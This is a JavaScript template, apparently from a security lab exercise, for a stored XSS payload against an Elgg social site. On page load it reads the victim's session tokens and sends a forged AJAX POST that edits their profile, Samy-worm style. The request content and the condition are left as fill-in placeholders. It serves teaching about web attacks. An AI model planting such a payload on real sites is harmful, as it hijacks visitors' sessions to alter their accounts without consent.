<script type="text/javascript">
    window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
    var content=...; //FILL IN

    //Referer: http://www.xsslabelgg.com/profile/alice/edit
    var referer = "http://www.xsslabelgg.com/profile/" + elgg.session.user.name + "/edit";

    if(//Condition to check if the user is not Samy)
    {
		//Create and send Ajax request to modify profile
		var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.setRequestHeader("Referer",referer);

    Ajax.send(content);
	}
	}
</script>